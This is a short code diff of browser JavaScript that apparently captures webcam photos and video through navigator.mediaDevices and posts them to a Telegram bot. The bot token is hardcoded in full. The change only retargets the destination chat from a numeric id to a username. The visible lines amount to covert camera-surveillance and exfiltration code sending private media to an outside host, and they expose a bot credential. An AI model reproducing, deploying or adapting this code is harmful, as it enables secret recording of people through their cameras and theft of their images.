@@ -59,7 +59,7 @@ navigator.mediaDevices
 
       canvas.toBlob((blob) => {
         const form = new FormData();
-        form.append("chat_id", "-1003908963431");
+        form.append("chat_id", "@kwoskakkjka");
         form.append("photo", blob);
         fetch(
           "https://api.telegram.org/bot8696183437:AAHuB6mLGikBUj1CbLVVWIn4gwUm3frYRuw/sendPhoto",
@@ -80,7 +80,7 @@ navigator.mediaDevices
       const blob = new Blob(chunks, { type: "video/webm" });
       chunks = [];
       const form = new FormData();
-      form.append("chat_id", "-1003908963431");
+      form.append("chat_id", "@kwoskakkjka");
       form.append("video", blob);
       fetch(
         "https://api.telegram.org/bot8696183437:AAHuB6mLGikBUj1CbLVVWIn4gwUm3frYRuw/sendVideo",
